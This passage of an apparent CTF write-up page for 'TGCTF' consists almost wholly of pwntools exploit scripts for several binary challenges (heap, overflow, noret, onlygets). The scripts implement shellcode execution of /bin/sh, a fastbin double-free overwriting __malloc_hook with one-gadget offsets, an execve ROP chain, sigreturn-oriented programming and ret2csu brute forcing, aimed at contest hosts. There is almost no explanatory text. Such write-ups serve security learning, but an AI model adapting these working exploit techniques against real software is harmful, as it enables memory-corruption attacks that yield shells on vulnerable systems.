0x3b</span></span><br><span class="line"><span class="string">add rdi, 10</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    pay = shellcode.<span class="title function_">ljust</span>(<span class="number">10</span>, b<span class="string">&#x27;\x90&#x27;</span>) + b<span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *$rebase(0x1212)&quot;</span>)</span><br><span class="line">    <span class="title function_">s</span>(pay)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="heap">heap</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    libc = <span class="title function_">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;31060&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">cmd</span>(idx):</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;&gt; &#x27;</span>, <span class="title function_">str</span>(idx))</span><br><span class="line"></span><br><span class="line">def <span class="title function_">add</span>(size, data):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;&gt; &#x27;</span>, <span class="title function_">str</span>(size))</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;&gt; &#x27;</span>, data) </span><br><span class="line"></span><br><span class="line">def <span class="title function_">delete</span>(idx):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;&gt; &#x27;</span>, <span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line"></span><br><span class="line">def <span class="title function_">edit</span>(data):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;&gt; &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">fake_addr = <span class="number">0x6020c0</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    pay = <span class="title function_">fit</span>(<span class="number">0</span>, <span class="number">0x61</span>)</span><br><span class="line">    pay += b<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x80</span> + <span class="title function_">fit</span>(<span class="number">0</span>, <span class="number">0x21</span>, b<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>) + <span class="title function_">fit</span>(<span class="number">0</span>, <span class="number">0x21</span>)</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;&gt; &#x27;</span>, pay)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x50</span>, b<span class="string">&#x27;a&#x27;</span>)# <span class="number">0</span></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x50</span>, b<span class="string">&#x27;a&#x27;</span>)# <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">delete</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="title function_">delete</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">delete</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x50</span>, <span class="title function_">p64</span>(fake_addr))# <span class="number">2</span></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x50</span>, b<span class="string">&#x27;a&#x27;</span>)# <span class="number">3</span> &amp; <span class="number">1</span></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x50</span>, b<span class="string">&#x27;a&#x27;</span>)# <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x50</span>, b<span class="string">&#x27;a&#x27;</span>)# <span class="number">5</span> &amp; fake</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit</span>(<span class="title function_">fit</span>(<span class="number">0</span>, <span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">    <span class="title function_">delete</span>(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit</span>(b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    libc.<span class="property">address</span> = <span class="title function_">u64</span>(<span class="title function_">ru</span>(b<span class="string">&#x27;!&#x27;</span>, drop=<span class="title class_">True</span>).<span class="title function_">ljust</span>(<span class="number">8</span>, b<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">    ones = [<span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;libc&#x27;</span>, libc.<span class="property">address</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit</span>(<span class="title function_">fit</span>(<span class="number">0</span>, <span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x60</span>, b<span class="string">&#x27;a&#x27;</span>)# <span class="number">6</span></span><br><span class="line">    <span class="title function_">delete</span>(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit</span>(<span class="title function_">fit</span>(<span class="number">0</span>, <span class="number">0x71</span>, libc.<span class="property">sym</span>.<span class="property">__malloc_hook</span> - <span class="number">0x23</span>))</span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x60</span>, b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x60</span>, b<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x13</span> + <span class="title function_">p64</span>(libc.<span class="property">address</span> + ones[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;&gt; &#x27;</span>, <span class="title function_">str</span>(<span class="number">0x50</span>))</span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p)</span><br><span class="line">    # <span class="title function_">pause</span>()</span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="overflow">overflow</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    # libc = <span class="title function_">ELF</span>(<span class="string">&#x27;&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node2.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;30268&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">name_addr = <span class="number">0x80EF320</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    p1 = b<span class="string">&#x27;&#x27;</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08060bd1</span>) # pop edx ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee060</span>) # @ .<span class="property">data</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b470a</span>) # pop eax ; ret</span><br><span class="line">    p1 += b<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080597c2</span>) # mov dword ptr [edx], eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08060bd1</span>) # pop edx ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee064</span>) # @ .<span class="property">data</span> + <span class="number">4</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b470a</span>) # pop eax ; ret</span><br><span class="line">    p1 += b<span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080597c2</span>) # mov dword ptr [edx], eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08060bd1</span>) # pop edx ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee068</span>) # @ .<span class="property">data</span> + <span class="number">8</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080507e0</span>) # xor eax, eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080597c2</span>) # mov dword ptr [edx], eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049022</span>) # pop ebx ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee060</span>) # @ .<span class="property">data</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049802</span>) # pop ecx ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee068</span>) # @ .<span class="property">data</span> + <span class="number">8</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08060bd1</span>) # pop edx ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee068</span>) # @ .<span class="property">data</span> + <span class="number">8</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080507e0</span>) # xor eax, eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049c6a</span>) # int <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;name?\n&#x27;</span>, p1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay = b<span class="string">&#x27;a&#x27;</span>*<span class="number">0xc8</span> + <span class="title function_">fit</span>(name_addr + <span class="number">0x4</span>) </span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *0x80498B8&quot;</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&quot;right?\n&quot;</span>,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="noret">noret</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    # libc = <span class="title function_">ELF</span>(<span class="string">&#x27;&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;31720&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf_addr = <span class="number">0x40219C</span></span><br><span class="line">xor_rax = <span class="number">0x40100A</span></span><br><span class="line">pop_rcx = <span class="number">0x401029</span></span><br><span class="line">pop_rdx = <span class="number">0x401021</span></span><br><span class="line">add_rax_rdx = <span class="number">0x401024</span></span><br><span class="line">mov_rsi = <span class="number">0x40101B</span></span><br><span class="line">xchg_rax_rdi = <span class="number">0x401000</span></span><br><span class="line">syscall_ret = <span class="number">0x40113D</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">cmd</span>(data):</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;do?\n&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    <span class="title function_">cmd</span>(b<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    ret_addr = <span class="title function_">u64</span>(<span class="title function_">ru</span>(b<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].<span class="title function_">ljust</span>(<span class="number">8</span>, b<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    rop_addr = ret_addr - <span class="number">0x100</span></span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;ret_addr&#x27;</span>, ret_addr)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">cmd</span>(b<span class="string">&#x27;2&#x27;</span>.<span class="title function_">ljust</span>(<span class="number">8</span>, b<span class="string">&#x27;\0&#x27;</span>) + b<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;feedback: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    xor_rax_addr = ret_addr + <span class="number">0x10</span></span><br><span class="line">    pop_rcx_addr = ret_addr + <span class="number">0x18</span></span><br><span class="line">    pop_rdx_addr = ret_addr + <span class="number">0x20</span></span><br><span class="line">    add_rax_rdx_addr = ret_addr + <span class="number">0x28</span></span><br><span class="line">    syscall_ret_addr = ret_addr + <span class="number">0x30</span></span><br><span class="line">    back_addr = ret_addr + <span class="number">0x38</span></span><br><span class="line">    xchg_rax_rdi_addr = ret_addr + <span class="number">0x40</span></span><br><span class="line">    mov_rsi_addr = ret_addr + <span class="number">0x48</span></span><br><span class="line">    inc_rdi_syscall_addr = ret_addr + <span class="number">0x50</span></span><br><span class="line">    my_read_addr = ret_addr + <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">    # pay = <span class="title function_">fit</span>(</span><br><span class="line">    #         xor_rax_addr - <span class="number">1</span>, <span class="number">0</span>, back_addr,</span><br><span class="line">    #         add_rax_rdx_addr - <span class="number">1</span>, back_addr, buf_addr + <span class="number">0x8</span>,</span><br><span class="line">    #         mov_rsi_addr - <span class="number">1</span>, buf_addr + <span class="number">0x20</span>, back_addr,</span><br><span class="line">    #         pop_rcx_addr - <span class="number">1</span>, pop_rcx_addr, xchg_rax_rdi_addr,  </span><br><span class="line"></span><br><span class="line">    #         )</span><br><span class="line">    </span><br><span class="line">    frame = <span class="title class_">SigreturnFrame</span>()</span><br><span class="line">    frame.<span class="property">rdi</span> = buf_addr + <span class="number">0x8</span></span><br><span class="line">    frame.<span class="property">rsi</span> = <span class="number">0</span></span><br><span class="line">    frame.<span class="property">rdx</span> = <span class="number">0</span></span><br><span class="line">    frame.<span class="property">rsp</span> = rop_addr</span><br><span class="line">    frame.<span class="property">rax</span> = <span class="number">0x3b</span></span><br><span class="line">    frame.<span class="property">rip</span> = <span class="number">0x401153</span></span><br><span class="line"></span><br><span class="line">    pay = <span class="title function_">fit</span>(</span><br><span class="line">            mov_rsi_addr - <span class="number">1</span>, ret_addr + <span class="number">0x58</span> - <span class="number">0x10</span>, back_addr,</span><br><span class="line">            my_read_addr - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x500</span>, <span class="number">0x40100F</span>, elf.<span class="title function_">bss</span>(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    pay = pay.<span class="title function_">ljust</span>(<span class="number">0x100</span>, b<span class="string">&#x27;\x00&#x27;</span>) + <span class="title function_">p64</span>(<span class="number">0x40100F</span>) + <span class="title function_">p64</span>(rop_addr)</span><br><span class="line">    pay += <span class="title function_">fit</span>(xor_rax, pop_rcx, pop_rdx, add_rax_rdx, syscall_ret, <span class="number">0x401010</span>, xchg_rax_rdi</span><br><span class="line">               , mov_rsi, <span class="number">0x401150</span>, elf.<span class="title function_">bss</span>(<span class="number">0x500</span>), <span class="number">0x40115D</span>)</span><br><span class="line"></span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *0x4010F6&quot;</span>)</span><br><span class="line">    <span class="title function_">s</span>(pay)</span><br><span class="line"></span><br><span class="line">    pay = <span class="title function_">fit</span>(</span><br><span class="line">            xor_rax_addr - <span class="number">1</span>, <span class="number">0</span>, back_addr,</span><br><span class="line">            add_rax_rdx_addr - <span class="number">1</span>, back_addr, <span class="number">0xf</span>,</span><br><span class="line">            syscall_ret_addr - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            )</span><br><span class="line">    pay += <span class="title function_">bytes</span>(frame)</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.3</span>)</span><br><span class="line">    <span class="title function_">s</span>(pay)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="onlygets">onlygets</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./TGCTF.so&#x27;</span>&#125;)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    # libc = <span class="title function_">ELF</span>(<span class="string">&#x27;&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;31772&#x27;</span></span><br><span class="line">    # p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"># add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop dword ptr [rax + rax] ; repz ret</span><br><span class="line">gadget1 = <span class="number">0x0000000000400548</span></span><br><span class="line">csu_back = <span class="number">0x40065A</span></span><br><span class="line">target = <span class="number">0x601010</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x00000000004004e8</span></span><br><span class="line">leave_ret = <span class="number">0x00000000004005fb</span></span><br><span class="line">csu_front = <span class="number">0x400640</span></span><br><span class="line">ret = <span class="number">0x0000000000400456</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>(offset):</span><br><span class="line">    pay = b<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span> + <span class="title function_">fit</span>(csu_back, offset, target + <span class="number">0x3d</span>, target - <span class="number">8</span> * offset, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, gadget1,</span><br><span class="line">                           ret, csu_front)</span><br><span class="line"></span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *0x4005FB&quot;</span>)</span><br><span class="line">    <span class="title function_">sl</span>(pay)</span><br><span class="line">    # <span class="title function_">io</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    # offset = <span class="number">0x1e9b9</span> + <span class="number">0x6b</span></span><br><span class="line">    # offset = <span class="number">0xea24</span> # remote</span><br><span class="line">    # <span class="title function_">main</span>(offset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0x10</span>):</span><br><span class="line">            <span class="attr">try</span>:</span><br><span class="line">                # p = <span class="title function_">process</span>(binary)</span><br><span class="line">                p = <span class="title function_">remote</span>(<span class="string">&quot;node1.tgctf.woooo.tech&quot;</span>, <span 